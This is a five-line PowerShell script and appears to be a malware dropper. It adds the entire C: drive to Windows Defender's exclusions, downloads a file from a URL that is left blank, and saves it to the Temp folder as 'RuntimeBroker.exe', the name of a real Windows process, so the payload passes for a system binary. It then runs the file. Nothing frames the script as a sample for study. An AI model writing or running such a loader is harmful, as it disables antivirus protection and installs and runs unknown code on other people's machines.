Add-MpPreference -ExclusionPath C:\
$url = ""
$output = "$env:Temp/RuntimeBroker.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output